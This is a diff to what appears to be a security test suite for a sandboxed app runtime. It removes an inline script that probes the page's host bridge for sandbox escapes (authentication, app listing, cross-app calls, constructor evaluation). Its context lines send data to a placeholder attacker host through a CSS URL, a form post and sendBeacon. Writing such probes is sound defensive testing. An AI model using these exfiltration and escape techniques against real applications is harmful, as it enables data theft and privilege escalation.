@@ -65,26 +65,6 @@ const attacker = "${attacker}";
 // Tailwind builds this class from the source text, wherever it is.
 const tailwindProbe = "bg-[url(${attacker}/tailwind)]";
 
-/** Reaches the page's bridge directly, past the SDK, as any inline script can. */
-const bridgeProbe = \`import { bridge } from "@grasp-os~sdk~screen-runtime.js";
-const page = bridge();
-const tried = async (run) => {
-  try {
-    await run();
-    return "allowed";
-  } catch (error) {
-    return error?.code ?? "refused";
-  }
-};
-const results = {
-  nameObject: await tried(() => page.call({ toString: () => "notes" }, [])),
-  session: await tried(() => page.authenticate()),
-  apps: await tried(() => page.apps.list()),
-  screens: await tried(() => page.screens.call("another-app", "notes", [])),
-  prototype: await tried(() => page.constructor("return 1")),
-};
-document.body.dataset.bridge = JSON.stringify(results);\`;
-
 const settled = async (attempt: () => unknown): Promise<string> => {
   try {
     const result = await attempt();
@@ -147,10 +127,6 @@ const probe = async (): Promise<Record<string, string>> => {
   form.action = \`\${attacker}/form\`;
   form.method = "post";
   document.body.append(form);
-  const script = document.createElement("script");
-  script.type = "module";
-  script.textContent = bridgeProbe;
-  document.head.append(script);
   // Neither says whether it got out: the attacker's server does.
   startUnanswered();
   navigator.sendBeacon(\`\${attacker}/beacon\`, "data");
